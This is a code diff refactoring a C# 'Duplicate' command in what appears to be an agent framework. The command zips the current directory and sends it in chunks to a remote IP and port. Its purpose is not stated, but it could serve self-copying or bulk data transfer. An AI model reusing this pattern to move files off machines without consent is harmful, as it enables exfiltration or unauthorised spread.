@@ -2,21 +2,16 @@
 using System;
 using System.IO;
 using System.Threading;
+using AgentModel.CommandData;
 
 namespace Agent.Commands
 {
-    public class Duplicate : Command
+    public class Duplicate : DuplicateData
     {
         public static int maxLength = 1024;
         public static string filename = "dra0042.zip";
 
-        public string ip { get; set; }
-        public int port { get; set; }
-
-        public Duplicate() : base() { }
-        public Duplicate(Agent agent) : base(agent) { }
-
-        public override void Execute()
+        public override void ExecuteCommand()
         {
             string path = filename;
             PackageControl.Zip(".", path);
@@ -27,7 +22,8 @@ namespace Agent.Commands
             for(int i = 0; i < count; i++) {
                 int index = i * maxLength;
                 parts[i] = text.Substring(index, Math.Min(maxLength, text.Length - index));
-                Command c = new Package(Agent) { partsCount = count, data = parts[i], fileName = filename, order = i };
+                Command c = new Package() { partsCount = count, data = parts[i], fileName = filename, order = i };
+                c.SetFromAgent(Agent);
                 new Sender(Agent, ip, port, CommandHandler.CommandToString(c)).Send();
                 Thread.Sleep(1);
             }
